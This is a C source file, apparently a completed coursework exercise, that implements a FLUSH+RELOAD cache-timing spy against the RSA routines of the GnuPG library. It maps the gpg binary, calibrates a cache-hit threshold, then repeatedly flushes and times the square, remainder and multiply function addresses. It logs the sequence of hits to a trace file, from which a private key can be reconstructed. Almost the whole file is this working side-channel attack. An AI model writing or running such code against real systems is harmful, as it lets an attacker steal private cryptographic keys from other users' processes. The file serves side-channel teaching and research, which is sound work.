#include "../lib/util.h"
#include "../lib/gnupg.h"

#include <assert.h>

// Initial value of threshold...changed in code later on
int threshold=200;
int probe_time=3000;

int misses = 0, start=0;
FILE *fp;

unsigned long start_time, end_time;
extern inline __attribute__((always_inline))
void flush_reload(void * addr, char * func) {
	uint64_t time_diff = measure_one_block_access_time(addr);
	clflush(addr);
	if(time_diff < threshold) {
		fputs(func,fp);
		start++;
		printf("%s",func);
		misses=0;
	} else {
		//Count number of misses to break the infinite loop when number of gpg accesses are done
		misses++;
	}
}
int main(int argc, char **argv) {
	/* TODO: Write your code here
	 *	For FLUSH+RELOAD attack on RSA algorithm implementation in GnuPG library
	*/
	char filename[100];
	strcpy(filename, "spy_trace");
	
	// Gets probe time from command line args if given
	if(argc == 2) {
		probe_time = atoi(argv[1]);
		strcat(filename, argv[1]);
	}
	
	fp = fopen(filename, "w+");
	assert(fp!=NULL);
	/*if(fp == NULL) {
		printf("Unable to create file");
		exit(0);
	}*/
	void *act_v;
	//Setting the addresses of functions passed in gnupg.h
	unsigned int offset[] = {square_add, remainder_add, multiply_add};
	unsigned int base_address;
	// Labels to indicate what function got a hit
	char *func_labels[3];
	func_labels[0] = "S";
	func_labels[1] = "R";
	func_labels[2] = "M";

	base_address = base_add;
	
	map_handle_t *handle;
	char *map;
	map = (char *) map_file(gnupg_path, &handle);  // mapping a file in memory (virtual address space)
	assert(map != NULL);
	if(map == NULL) {
		printf("GPG path is incorrect\n");
		exit(0);
	}
	// Getting the average threshold from calibration
	printf("Calculating Threshold..........\n");
	threshold = getThreshold()-40;
	printf("Threshold: %d\n", threshold);
	
	start_time = rdtscp();
	while(1) {
		// Wait for probe time
		end_time = rdtscp();
		if((end_time-start_time) >= probe_time) {
			for(int i=0;i<3;i++) {
				// Getting the effective virtual address of RSA Functions
				act_v = map + offset[i] - base_address;
				// Start flushing and reloading
				flush_reload(act_v, func_labels[i]);
			}
			start_time = end_time;
		}
		// Condition to break while loop when gpg accesses are finished
		if(start >= 2000 && misses >= 8000) {
			break;
		}		
	}
	unmap_file(handle);     // unmapping the file.
  	fclose(fp);
	return 0;
}
